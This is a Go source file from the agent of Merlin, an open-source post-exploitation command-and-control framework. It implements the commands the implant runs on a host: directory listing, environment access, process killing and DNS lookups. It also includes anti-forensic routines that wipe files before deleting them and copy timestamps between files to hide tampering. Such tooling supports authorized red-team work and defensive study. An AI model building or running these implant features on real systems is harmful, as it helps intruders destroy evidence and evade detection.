// Merlin is a post-exploitation command and control framework.
// This file is part of Merlin.
// Copyright (C) 2021  Russel Van Tuyl

// Merlin is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.

// Merlin is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with Merlin.  If not, see <http://www.gnu.org/licenses/>.

package commands

import (
	// Standard
	"fmt"
	"io/ioutil"
	"math"
	"net"
	"os"
	"path/filepath"
	"strconv"
	"strings"

	// Internal
	"github.com/Ne0nd0g/merlin/pkg/agent/cli"
	"github.com/Ne0nd0g/merlin/pkg/jobs"
)

// Native executes a golang native command that does not use any executables on the host
func Native(cmd jobs.Command) jobs.Results {
	cli.Message(cli.DEBUG, fmt.Sprintf("Entering into commands.Native() with %+v...", cmd))
	var results jobs.Results

	cli.Message(cli.NOTE, fmt.Sprintf("Executing native command: %s", cmd.Command))

	switch cmd.Command {
	// TODO create a function for each Native Command that returns a string and error and DOES NOT use (a *Agent)

	case "cd":
		err := os.Chdir(cmd.Args[0])
		if err != nil {
			results.Stderr = fmt.Sprintf("there was an error changing directories when executing the 'cd' command:\r\n%s", err.Error())
		} else {
			path, pathErr := os.Getwd()
			if pathErr != nil {
				results.Stderr = fmt.Sprintf("there was an error getting the working directory when executing the 'cd' command:\r\n%s", pathErr.Error())
			} else {
				results.Stdout = fmt.Sprintf("Changed working directory to %s", path)
			}
		}
	case "env":
		results.Stdout, results.Stderr = env(cmd.Args)
	case "kill":
		targetpid, err := strconv.Atoi(cmd.Args[0])
		if err != nil || targetpid < 0 {
			results.Stderr = fmt.Sprintf("Invalid PID: %d\r\n", targetpid)
			break
		}
		proc, err := os.FindProcess(targetpid)
		if err != nil { // On linux, always returns a process. Don't worry, the Kill() will fail
			results.Stderr = fmt.Sprintf("Could not find a process with pid %d\r\n%s", targetpid, err.Error())
			break
		}
		err = proc.Kill()
		if err != nil {
			results.Stderr = fmt.Sprintf("Error killing pid %d\r\n%s", targetpid, err.Error())
			break
		}
		results.Stdout = fmt.Sprintf("Successfully killed pid %d\n", targetpid)
	case "ls":
		listing, err := list(cmd.Args[0])
		if err != nil {
			results.Stderr = fmt.Sprintf("there was an error executing the 'ls' command:\r\n%s", err.Error())
			break
		}
		results.Stdout = listing
	case "nslookup":
		results.Stdout, results.Stderr = nslookup(cmd.Args)
	case "pwd":
		dir, err := os.Getwd()
		if err != nil {
			results.Stderr = fmt.Sprintf("there was an error getting the working directory when executing the 'pwd' command:\r\n%s", err.Error())
		} else {
			results.Stdout = fmt.Sprintf("Current working directory: %s", dir)
		}
	case "sdelete":
		results.Stdout, results.Stderr = sdelete(cmd.Args[1])
	case "touch":
		results.Stdout, results.Stderr = touch(cmd.Args[1], cmd.Args[2])
	default:
		results.Stderr = fmt.Sprintf("%s is not a valid NativeCMD type", cmd.Command)
	}

	if results.Stderr == "" {
		if results.Stdout != "" {
			cli.Message(cli.SUCCESS, results.Stdout)
		}
	} else {
		cli.Message(cli.WARN, results.Stderr)
	}
	return results
}

func env(Args []string) (string, string) {
	var resp string
	var stderr string
	if len(Args) == 2 {
		if Args[1] == "showall" {
			resp += "\n"
			for _, element := range os.Environ() {
				resp += element
				resp += "\n"
			}
		} else {
			stderr += fmt.Sprintf("Unknown action: %s", Args[1])
		}
	} else if len(Args) == 3 {
		if Args[1] == "get" {
			resp = Args[2] + "="
			resp += os.Getenv(Args[2])
		} else if Args[1] == "unset" {
			os.Unsetenv(Args[2])
			resp = fmt.Sprintf("Unset environment variable: %s", Args[2])
		} else {
			stderr += fmt.Sprintf("Invalid action: %s", Args[1])
		}
	} else if len(Args) == 4 {
		if Args[1] == "set" {
			os.Setenv(Args[2], Args[3])
			resp = fmt.Sprintf("Setting environment variable: %s=%s", Args[2], Args[3])
		} else {
			stderr += fmt.Sprintf("Invalid action: %s", Args[1])
		}
	} else {
		stderr += fmt.Sprintf("Invalid arguments")
	}

	return resp, stderr
}

// list gets and returns a list of files and directories from the input file path
func list(path string) (string, error) {
	cli.Message(cli.DEBUG, fmt.Sprintf("Received input parameter for list command function: %s", path))
	cli.Message(cli.SUCCESS, fmt.Sprintf("listing directory contents for: %s", path))

	// Resolve relative path to absolute
	aPath, errPath := filepath.Abs(path)
	if errPath != nil {
		return "", errPath
	}
	files, err := ioutil.ReadDir(aPath)

	if err != nil {
		return "", err
	}

	details := fmt.Sprintf("Directory listing for: %s\r\n\r\n", aPath)

	for _, f := range files {
		perms := f.Mode().String()
		size := strconv.FormatInt(f.Size(), 10)
		modTime := f.ModTime().String()[0:19]
		name := f.Name()
		details = details + perms + "\t" + modTime + "\t" + size + "\t" + name + "\n"
	}
	return details, nil
}

// nslookup is used to perform a DNS query using the host's configured resolver
func nslookup(query []string) (string, string) {
	var resp string
	var stderr string
	for _, q := range query {
		ip := net.ParseIP(q)
		if ip != nil {
			r, err := net.LookupAddr(ip.String())
			if err != nil {
				stderr += fmt.Sprintf("there was an error calling the net.LookupAddr function for %s:\r\n%s", q, err)
			}
			resp += fmt.Sprintf("Query: %s, Result: %s\r\n", q, strings.Join(r, " "))
		} else {
			r, err := net.LookupHost(q)
			if err != nil {
				stderr += fmt.Sprintf("there was an error calling the net.LookupHost function for %s:\r\n%s", q, err)
			}
			resp += fmt.Sprintf("Query: %s, Result: %s\r\n", q, strings.Join(r, " "))
		}
	}
	return resp, stderr
}

func sdelete(targetfile string) (string, string) {
	var targetFile = targetfile
	var resp string
	var stderr string

	// make sure we open the file with correct permission
	// otherwise we will get the bad file descriptor error
	file, err := os.OpenFile(targetFile, os.O_RDWR, 0666)

	if err != nil {
		stderr = fmt.Sprintf("Error opening file: %s\r\n%s", targetfile, err.Error())
		return resp, stderr
	}

	// find out how large is the target file
	fileInfo, err := file.Stat()

	if err != nil {
		stderr = fmt.Sprintf("Error determining file size: %s\r\n%s", targetfile, err.Error())
		return resp, stderr
	} else {

		// calculate the new slice size
		// based on how large our target file is
		var fileSize int64 = fileInfo.Size()
		const fileChunk = 1 * (1 << 20) //1MB Chunks

		// calculate total number of parts the file will be chunked into
		totalPartsNum := uint64(math.Ceil(float64(fileSize) / float64(fileChunk)))

		lastPosition := 0

		for i := uint64(0); i < totalPartsNum; i++ {
			partSize := int(math.Min(fileChunk, float64(fileSize-int64(i*fileChunk))))
			partZeroBytes := make([]byte, partSize)

			// fill out the part with zero value
			copy(partZeroBytes[:], "0")

			// over write every byte in the chunk with 0
			n, err := file.WriteAt([]byte(partZeroBytes), int64(lastPosition))

			if err != nil {
				stderr = fmt.Sprintf("Error over writing file: %s\r\n%s", targetfile, err.Error())
				return resp, stderr
			}

			resp += fmt.Sprintf("Wiped %v bytes.\n", n)

			// update last written position
			lastPosition = lastPosition + partSize
		}

		file.Close()

		// finally remove/delete our file
		err = os.Remove(targetFile)
		if err != nil {
			stderr = fmt.Sprintf("Error deleting file: %s\r\n%s", targetfile, err.Error())
			return resp, stderr
		}
		resp += fmt.Sprintf("Securely deleted file: %s\n", targetfile)

		return resp, stderr
	}
}

func touch(inputsourcefile string, inputdestinationfile string) (string, string) {
	var resp string
	var stderr string

	sourcefilename := inputsourcefile
	destinationfilename := inputdestinationfile

	// get last modified time of source file
	sourcefile, err1 := os.Stat(sourcefilename)

	if err1 != nil {
		stderr = fmt.Sprintf("Error retrieving last modified time of: %s\n%s\n", sourcefilename, err1.Error())
		return resp, stderr
	}

	modifiedtime := sourcefile.ModTime()

	// change both atime and mtime to last modified time of source file
	err2 := os.Chtimes(destinationfilename, modifiedtime, modifiedtime)

	if err2 != nil {
		stderr = fmt.Sprintf("Error changing last modified and accessed time of: %s\n%s\n", destinationfilename, err2.Error())
		return resp, stderr
	} else {
		resp = fmt.Sprintf("File: %s\nLast modified and accessed time set to: %s\n", destinationfilename, modifiedtime)
		return resp, stderr
	}
}
